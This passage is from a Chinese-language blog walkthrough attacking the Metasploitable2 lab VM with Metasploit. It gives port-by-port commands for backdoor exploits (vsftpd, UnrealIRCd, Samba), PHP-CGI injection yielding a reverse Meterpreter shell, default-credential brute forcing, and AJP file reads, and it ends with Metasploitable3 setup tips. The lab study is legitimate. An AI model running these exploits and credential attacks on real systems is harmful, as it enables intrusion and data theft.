+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Nmap: Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">22.59</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>端口和对应服务都展示出来了</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="21端口-vsftpd"><a href="#21端口-vsftpd" class="headerlink" title="21端口 vsftpd"></a>21端口 vsftpd</h3><p>查找 ftp 相关的辅助模块</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search <span class="token function">ftp</span> type:auxiliary<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250609203319000.png" alt="image-20250609203319000"></p>
+<p>这里选用 ftp_version 模块，然后设置参数</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">13</span>
+<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.253.137
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250609203836829.png" alt="image-20250609203836829"></p>
+<p>同上面的扫描结果一样，得到的 vsftpd 版本是 2.3.4</p>
+<p><code>back</code> 退出当前模块</p>
+<p>接下来查找 vsftp 的 exp</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search vsftp type:exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250609204347959.png" alt="image-20250609204347959"></p>
+<blockquote>
+<p>在特定版本的vsftpd服务器程序中，被人恶意植入代码，当用户名以“: )”结尾时，服务器就会在6200端口监听，并且能够执行任意代码</p>
+</blockquote>
+<p>依旧是选中模块然后 set rhosts</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250609204539835.png" alt="image-20250609204539835"></p>
+<p>成功getshell</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250609204614686.png" alt="image-20250609204614686"></p>
+<p>靶机处会记录日志，注意这里需要 root 读取</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610121453466.png" alt="image-20250610121453466"></p>
+<hr>
+<h3 id="22端口-ssh"><a href="#22端口-ssh" class="headerlink" title="22端口 ssh"></a>22端口 ssh</h3><p>尝试暴力破解ssh</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search ssh_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250609204931310.png" alt="image-20250609204931310"></p>
+<p>爆破的话，需要配置 username 和 password 的字典</p>
+<p>这里直接设置正确的账密</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> username root
+<span class="token builtin class-name">set</span> password <span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250609210829387.png" alt="image-20250609210829387"></p>
+<p>此时靶机的ssh日志</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tail</span> /var/log/auth.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250609211009451.png" alt="image-20250609211009451"></p>
+<hr>
+<h3 id="23端口-telnet"><a href="#23端口-telnet" class="headerlink" title="23端口 telnet"></a>23端口 telnet</h3><p>暴力破解</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search telnet_login
+use <span class="token number">1</span>
+<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.253.137
+<span class="token builtin class-name">set</span> username msfadmin
+<span class="token builtin class-name">set</span> password msfadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610111035523.png" alt="image-20250610111035523"></p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610111140670.png" alt="image-20250610111140670"></p>
+<p>尝试登录</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610113255084.png" alt="image-20250610113255084"></p>
+<p>靶机此时的进程</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610114611457.png" alt="image-20250610114611457"></p>
+<p>日志在 &#x2F;var&#x2F;log&#x2F;auth.log</p>
+<hr>
+<h3 id="80端口-http"><a href="#80端口-http" class="headerlink" title="80端口 http"></a>80端口 http</h3><p>访问 phpinfo.php</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610113839133.png" alt="image-20250610113839133"></p>
+<p>注意到这里是用 cgi 起的 server api</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610113943814.png" alt="image-20250610113943814"></p>
+<p>这个方式存在 PHP-CGI 参数注入</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search php_cgi
+use <span class="token number">0</span>
+show options
+<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.253.137
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610114340921.png" alt="image-20250610114340921"></p>
+<p>这里会起一个反弹的 Meterpreter Shell</p>
+<h4 id="Meterpreter-Shell"><a href="#Meterpreter-Shell" class="headerlink" title="Meterpreter Shell"></a>Meterpreter Shell</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Core Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    <span class="token function">bg</span>                        Alias <span class="token keyword">for</span> background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session <span class="token punctuation">(</span>for http/https<span class="token punctuation">)</span>
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    <span class="token builtin class-name">exit</span>                      Terminate the meterpreter session
+    guid                      Get the session GUID
+    <span class="token builtin class-name">help</span>                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or <span class="token function">more</span> meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    <span class="token builtin class-name">read</span>                      Reads data from a channel
+    resource                  Run the commands stored <span class="token keyword">in</span> a <span class="token function">file</span>
+    run                       Executes a meterpreter script or Post module
+    secure                    <span class="token punctuation">(</span>Re<span class="token punctuation">)</span>Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    use                       Deprecated <span class="token builtin class-name">alias</span> <span class="token keyword">for</span> <span class="token string">"load"</span>
+    uuid                      Get the UUID <span class="token keyword">for</span> the current session
+    <span class="token function">write</span>                     Writes data to a channel
+
+
+Stdapi: File system Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+    Command       Description
+    -------       -----------
+    <span class="token function">cat</span>           Read the contents of a <span class="token function">file</span> to the <span class="token function">screen</span>
+    <span class="token builtin class-name">cd</span>            Change directory
+    checksum      Retrieve the checksum of a <span class="token function">file</span>
+    <span class="token function">chmod</span>         Change the permissions of a <span class="token function">file</span>
+    <span class="token function">cp</span>            Copy <span class="token builtin class-name">source</span> to destination
+    del           Delete the specified <span class="token function">file</span>
+    <span class="token function">dir</span>           List files <span class="token punctuation">(</span>alias <span class="token keyword">for</span> <span class="token function">ls</span><span class="token punctuation">)</span>
+    download      Download a <span class="token function">file</span> or directory
+    edit          Edit a <span class="token function">file</span>
+    getlwd        Print <span class="token builtin class-name">local</span> working directory
+    getwd         Print working directory
+    lcat          Read the contents of a <span class="token builtin class-name">local</span> <span class="token function">file</span> to the <span class="token function">screen</span>
+    lcd           Change <span class="token builtin class-name">local</span> working directory
+    lls           List <span class="token builtin class-name">local</span> files
+    lpwd          Print <span class="token builtin class-name">local</span> working directory
+    <span class="token function">ls</span>            List files
+    <span class="token function">mkdir</span>         Make directory
+    <span class="token function">mv</span>            Move <span class="token builtin class-name">source</span> to destination
+    <span class="token builtin class-name">pwd</span>           Print working directory
+    <span class="token function">rm</span>            Delete the specified <span class="token function">file</span>
+    <span class="token function">rmdir</span>         Remove directory
+    search        Search <span class="token keyword">for</span> files
+    upload        Upload a <span class="token function">file</span> or directory
+
+
+Stdapi: Networking Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command       Description
+    -------       -----------
+    portfwd       Forward a <span class="token builtin class-name">local</span> port to a remote <span class="token function">service</span>
+    resolve       Resolve a <span class="token builtin class-name">set</span> of <span class="token function">host</span> names on the target
+
+
+Stdapi: System Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command       Description
+    -------       -----------
+    execute       Execute a <span class="token builtin class-name">command</span>
+    getenv        Get one or <span class="token function">more</span> environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    <span class="token function">kill</span>          Terminate a process
+    localtime     Displays the target system <span class="token builtin class-name">local</span> <span class="token function">date</span> and <span class="token function">time</span>
+    pgrep         Filter processes by name
+    <span class="token function">pkill</span>         Terminate processes by name
+    <span class="token function">ps</span>            List running processes
+    shell         Drop into a system <span class="token builtin class-name">command</span> shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio <span class="token function">file</span> <span class="token punctuation">(</span>.wav<span class="token punctuation">)</span> on the target system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610115052962.png" alt="image-20250610115052962"></p>
+<p>exit 退出</p>
+<hr>
+<h3 id="139-x2F-445端口-Samba"><a href="#139-x2F-445端口-Samba" class="headerlink" title="139&#x2F;445端口 Samba"></a>139&#x2F;445端口 Samba</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search samba<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610115408081.png" alt="image-20250610115408081"></p>
+<p>这里选择 exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script 模块尝试 rce</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">8</span>
+show options
+<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.253.137<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610120557805.png" alt="image-20250610120557805"></p>
+<p>成功 getshell，可 quit 退出</p>
+<p>此时的靶机进程与日志目录</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610121126962.png" alt="image-20250610121126962"></p>
+<p>smb 日志名会记录连接的 IP</p>
+<hr>
+<h3 id="1099端口-java-rmi"><a href="#1099端口-java-rmi" class="headerlink" title="1099端口 java-rmi"></a>1099端口 java-rmi</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search java_rmi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610122739513.png" alt="image-20250610122739513"></p>
+<p>先用辅助模块进行信息收集，然后打 rmi server</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610123034555.png" alt="image-20250610123034555"></p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610124806451.png" alt="image-20250610124806451"></p>
+<hr>
+<h3 id="1524端口-bindshell"><a href="#1524端口-bindshell" class="headerlink" title="1524端口 bindshell"></a>1524端口 bindshell</h3><p>ingreslock 后门，监听在1524端口</p>
+<p>直接 telnet 连接即可</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610125145618.png" alt="image-20250610125145618"></p>
+<hr>
+<h3 id="3306端口-mysql"><a href="#3306端口-mysql" class="headerlink" title="3306端口 mysql"></a>3306端口 mysql</h3><p>依旧是爆破</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search mysql_login
+use <span class="token number">0</span>
+<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.253.137
+<span class="token builtin class-name">set</span> user_as_pass <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610125504802.png" alt="image-20250610125504802"></p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610125841332.png" alt="image-20250610125841332"></p>
+<p>空密码，直接登录即可</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.253.137 <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610125940650.png" alt="image-20250610125940650"></p>
+<hr>
+<h3 id="5432端口-postgresql"><a href="#5432端口-postgresql" class="headerlink" title="5432端口 postgresql"></a>5432端口 postgresql</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search postgresql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610130430961.png" alt="image-20250610130430961"></p>
+<h4 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h4><p>先爆破密码，使用 auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_login</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">7</span>
+<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.253.137<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610130605054.png" alt="image-20250610130605054"></p>
+<p>这里有 msf 自带的字典可以爆破</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610130549965.png" alt="image-20250610130549965"></p>
+<p>得到账密 <code>postgres:postgres@template1</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">psql <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.253.137 <span class="token parameter variable">-U</span> postgres<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610131055395.png" alt="image-20250610131055395"></p>
+<hr>
+<h3 id="Postgres共享库代码任意执行"><a href="#Postgres共享库代码任意执行" class="headerlink" title="Postgres共享库代码任意执行"></a>Postgres共享库代码任意执行</h3><blockquote>
+<p>在一些默认的 Linux 安装的 PostgreSQL，postgres 服务账户可以写到 &#x2F;tmp 目录，获得 udf 共享库，从而允许任意执行代码</p>
+</blockquote>
+<p>使用 exploit&#x2F;linux&#x2F;postgres&#x2F;postgres_payload 模块</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610131445669.png" alt="image-20250610131445669"></p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610131546646.png" alt="image-20250610131546646"></p>
+<hr>
+<h3 id="5900端口-VNC"><a href="#5900端口-VNC" class="headerlink" title="5900端口 VNC"></a>5900端口 VNC</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search vnc_login
+use <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610132009444.png" alt="image-20250610132009444"></p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610132044263.png" alt="image-20250610132044263"></p>
+<p>密码 password，vncviewer 登录即可</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610132228095.png" alt="image-20250610132228095"></p>
+<hr>
+<h3 id="6667端口-IRC"><a href="#6667端口-IRC" class="headerlink" title="6667端口 IRC"></a>6667端口 IRC</h3><p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610132627987.png" alt="image-20250610132627987"></p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610132857676.png" alt="image-20250610132857676"></p>
+<p>靶机上的此版本 irc 存在后门漏洞，使用 exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor 模块</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610133044606.png" alt="image-20250610133044606"></p>
+<p>需要手动配置 payload 并配置 lhost</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show payloads
+<span class="token builtin class-name">set</span> payload <span class="token number">5</span>
+<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.253.128<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610133154773.png" alt="image-20250610133154773"></p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610133252181.png" alt="image-20250610133252181"></p>
+<hr>
+<h3 id="8009端口-AJP"><a href="#8009端口-AJP" class="headerlink" title="8009端口 AJP"></a>8009端口 AJP</h3><p>可参考 <a href="/blog/2024/05/01/ISCC-2024/#%E5%8E%9F%E7%A5%9E%E5%90%AF%E5%8A%A8">ISCC2024 原神启动</a></p>
+<p>任意文件读取</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610134022916.png" alt="image-20250610134022916"></p>
+<p>这里是读取到了 web.xml</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span>
+<span class="token comment">&lt;!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+--></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/j2ee<span class="token punctuation">"</span></span>
+    <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
+    <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd<span class="token punctuation">"</span></span>
+    <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>Welcome to Tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>
+     Welcome to Tomcat
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>
+
+<span class="token comment">&lt;!-- JSPC servlet mappings start --></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>org.apache.jsp.index_jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.apache.jsp.index_jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>org.apache.jsp.index_jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>
+
+<span class="token comment">&lt;!-- JSPC servlet mappings end --></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可修改 filename 实现任意文件读取，注意这里的 filename 是相对于 web 目录的</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610134258945.png" alt="image-20250610134258945"></p>
+<hr>
+<h3 id="8180端口-Tomcat"><a href="#8180端口-Tomcat" class="headerlink" title="8180端口 Tomcat"></a>8180端口 Tomcat</h3><p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610133354541.png" alt="image-20250610133354541"></p>
+<p>弱密码 tomcat:tomcat 登录 admin</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610133432327.png" alt="image-20250610133432327"></p>
+<p>同样的账密进入 manager</p>
+<p><img src="/blog/2025/06/07/Metasploit%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/image-20250610133556815.png" alt="image-20250610133556815"></p>
+<br>
+
+<p>不知道还有哪些其他的漏洞了XD</p>
+<hr>
+<h1 id="msf3靶机环境"><a href="#msf3靶机环境" class="headerlink" title="msf3靶机环境"></a>msf3靶机环境</h1><p>这个需要自行构建，官方仓库：<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploitable3">https://github.com/rapid7/metasploitable3</a></p>
+<p>Packer：<a target="_blank" rel="noopener" href="https://developer.hashicorp.com/packer/install">https://developer.hashicorp.com/packer/install</a></p>
+<p>Packer 解压后只需要设置环境变量为 Packer 目录即可</p>
+<p>Vagrant（一个基于Ruby的工具，用于创建和部署虚拟化开发环境）：<a target="_blank" rel="noopener" href="https://developer.hashicorp.com/vagrant/docs/installation">https://developer.hashicorp.com/vagrant/docs/installation</a></p>
+<h2 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a>安装问题</h2><p>针对 Windows</p>
+<ul>
+<li><p>如果c盘内存不足，请活用软链接</p>
+</li>
+<li><p>报错<code>bad Gem::URI(is not Gem::URI?): &quot;127.0.0.1:7890&quot;</code>：检查环境变量，代理变量需要有协议开头<code>set http_proxy=http://127.0.0.1:7890</code></p>
+</li>
+<li><p>Error: Failed to initialize build “vmware-iso”，缺失对应插件，照着安装即可</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">packer plugins install github<span class="token punctuation">.</span>com/hashicorp/vmware
+packer plugins install github<span class="token punctuation">.</span>com/hashicorp/vagrant<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</li>
+<li><p>如果安装镜像时没有修改为本地iso镜像，则需要代理 tun 开全局模式才能正常下载</p>
+</li>
